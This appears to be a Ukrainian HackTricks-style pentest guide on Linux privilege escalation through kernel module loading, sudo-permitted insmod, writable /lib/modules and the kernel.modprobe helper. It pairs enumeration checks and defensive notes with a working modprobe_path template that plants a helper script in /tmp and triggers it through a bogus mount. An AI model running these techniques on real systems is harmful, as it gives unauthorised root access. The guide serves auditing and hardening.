# Зловживання Kernel Modules і modprobe

## Неправильні налаштування Kernel Modules і завантаження модулів

Підтримка Kernel Modules є важливою сферою під час перевірки ескалації привілеїв у Linux. Не вважайте кожне повідомлення про непідписаний модуль експлуатованим саме по собі, але використовуйте його, щоб отримати відповіді на практичні запитання.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- Чи може поточний користувач завантажувати модулі через `sudo`, capabilities або шлях до helper, доступний для запису?
- Чи все ще увімкнене завантаження модулів?
- Чи вимкнене забезпечення підписів модулів?
- Чи доступні каталоги модулів або файли модулів для запису?
- Чи можна читати kernel logs, щоб підтвердити, що сталося?

Швидка первинна перевірка починається з наведених нижче перевірок статусу модулів, підписів, logging і дерева модулів.<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>
```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```
Тлумачення:

- `modules_disabled=1` означає, що модулі не можна ні завантажувати, ні вивантажувати, а значення не можна скинути до `0` до перезавантаження.<sup>[[1]](#references)</sup>
- `module.sig_enforce=1` у командному рядку ядра або `CONFIG_MODULE_SIG_FORCE=y` вимагає дійсно підписаних модулів; інакше непідписані модулі можуть завантажитися й позначити ядро як скомпрометоване.<sup>[[2]](#references)</sup>
- `dmesg_restrict=0` не накладає обмежень на `dmesg`; коли встановлено значення `1`, для доступу потрібна `CAP_SYSLOG`.<sup>[[1]](#references)</sup>
- Доступні для запису шляхи в `/lib/modules/$(uname -r)/` є небезпечними, оскільки `modprobe` під час завантаження модулів шукає в цьому дереві та його даних залежностей.<sup>[[8]](#references)</sup>

### Завантаження модуля та читання виводу ядра

Якщо у вас є законний дозвіл на завантаження локального модуля, `insmod` вставляє саме вказаний вами файл `.ko`. Функція ініціалізації модуля виконується як частина завантаження, а повідомлення, записані за допомогою `printk()`, потрапляють до буфера журналу ядра, який зазвичай читають за допомогою `dmesg`.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Мінімальний процес перевірки використовує `modinfo` для перегляду метаданих, `insmod` і `rmmod` для завантаження та видалення модуля, `lsmod` для підтвердження стану завантаження та `dmesg` для перегляду журналів ядра.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```
Якщо `sudo -l` дозволяє виконувати `insmod`, `modprobe` або обгортку над ними, сприймайте це як критичну вразливість: `sudo -l` перелічує привілеї користувача, який виконує команду, а завантаження kernel module потребує `CAP_SYS_MODULE`.<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>
```bash
sudo -l
sudo /sbin/insmod ./example.ko
```
### Дозволений через `sudo` `insmod`

Правило `sudo`, яке дозволяє користувачу запускати `insmod`, не можна порівнювати з дозволом на використання звичайного адміністративного допоміжного засобу. Код ініціалізації модуля виконується під час вставлення, тому практичне питання під час перевірки полягає в тому, чи може цей користувач вибрати або змінити модуль, який завантажується.<sup>[[3]](#references)</sup>

Наведений нижче узагальнений процес перевірки повторює перевірки інспекції, завантаження, стану, журналу та видалення для модуля-кандидата.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```
Якщо користувач може надати довільний `.ko`, під час авторизованої оцінки це слід розглядати як повну компрометацію системи. Безпечніша операційна практика — не делегувати завантаження модулів через sudo; якщо це неминуче, обмежте точний шлях, власника, дозволи, політику підписування та процедуру видалення.<sup>[[3]](#references)[[10]](#references)</sup>

Для нешкідливого підходу до збирання модулів у контрольованій лабораторії нижче наведено мінімальні source і Makefile; форма `make -C /lib/modules/$(uname -r)/build M=$PWD` відповідає задокументованому в ядрі робочому процесу kbuild для зовнішніх модулів.<sup>[[5]](#references)[[7]](#references)</sup>
```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
printk(KERN_INFO "demo module loaded\n");
return 0;
}

static void __exit demo_exit(void) {
printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
Збирайте та завантажуйте лише в авторизованій лабораторії; kbuild збирає зовнішній модуль, а команди завантаження/видалення викликають інтерфейси kernel module.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>
```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```
### Перевірки зловживання `kernel.modprobe` / `modprobe_path`

`kernel.modprobe` задає userspace helper, який kernel виконує для запитів на автоматичне завантаження модулів; цей sysctl впливає на автоматичне завантаження, але не на явне вставлення модулів. Якщо attacker може змінити його на шлях до executable, доступного для запису, і викликати запит модуля, цей helper стає привілейованим шляхом виконання коду.<sup>[[1]](#references)</sup>

Перевірте поточний шлях до helper через інтерфейс kernel sysctl і перевірте власника та mode цільового об’єкта.<sup>[[1]](#references)</sup>
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```
Перевірте, чи можна вплинути на sysctl, делеговані правила sudo або файлові capabilities.<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>
```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```
Наведений нижче шаблон призначений лише для лабораторного використання: він змінює шлях до helper і запускає задокументований запит на автоматичне завантаження модуля; використовуйте його лише в ізольованій системі, на яку ви маєте дозвіл.<sup>[[1]](#references)</sup>

У сучасних ядрах Linux не використовуйте невідомий виконуваний файл як універсальний тригер: застаріле автоматичне завантаження модулів для спеціальних форматів бінарних файлів було вилучено в Linux 6.14, тоді як документація ядра визначає невідомий тип файлової системи як шлях для запиту на автоматичне завантаження модуля.<sup>[[1]](#references)[[11]](#references)</sup>
```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```
На hardened systems це має завершуватися помилкою, коли permissions перешкоджають непривілейованому запису до `kernel.modprobe`, шлях до helper недоступний для запису або auto-loading модулів вимкнено.<sup>[[1]](#references)</sup>

### Перевірка writable `/lib/modules`

Writable директорії модулів можуть уможливити заміну модулів, розміщення malicious модулів або зловживання auto-load залежно від того, як згодом викликається `modprobe`; `modprobe` виконує пошук у `/lib/modules/$(uname -r)` і використовує дані про залежності під час розв’язання модулів.<sup>[[8]](#references)</sup>

Перевірте writable файли модулів і метадані залежностей/alias у дереві модулів активного kernel release.<sup>[[8]](#references)</sup>
```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```
Якщо ви виявите вміст модуля, доступний для запису, дослідіть, як `modprobe` розв'язує залежності та як `modinfo` повідомляє метадані модуля.<sup>[[8]](#references)[[12]](#references)</sup>
```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```
Захисні примітки:

- Залишайте `/lib/modules` у власності `root:root` і недоступним для запису користувачам.<sup>[[8]](#references)</sup>
- Встановлюйте `kernel.modules_disabled=1` після завантаження системи, якщо це можливо з операційної точки зору.<sup>[[1]](#references)</sup>
- Забезпечуйте підписування модулів у системах, де потрібні модулі, які можна завантажувати.<sup>[[2]](#references)</sup>
- Відстежуйте записи до `/proc/sys/kernel/modprobe`, `/lib/modules`, а також неочікуване виконання `insmod`/`modprobe`.<sup>[[1]](#references)[[8]](#references)</sup>

## References

- [1] [Документація для /proc/sys/kernel/ — документація ядра Linux](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Механізм підписування модулів ядра — документація ядра Linux](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — сторінка посібника Linux](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Основи драйверів — документація ядра Linux](https://docs.kernel.org/driver-api/basics.html)
- [6] [Журналювання повідомлень за допомогою printk — документація ядра Linux](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [Збирання зовнішніх модулів — документація ядра Linux](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — сторінка посібника Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [Об'єднання тегу 'execve-v6.14-rc1' — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/getcap.8.html)
{{#include ../../banners/hacktricks-training.md}}
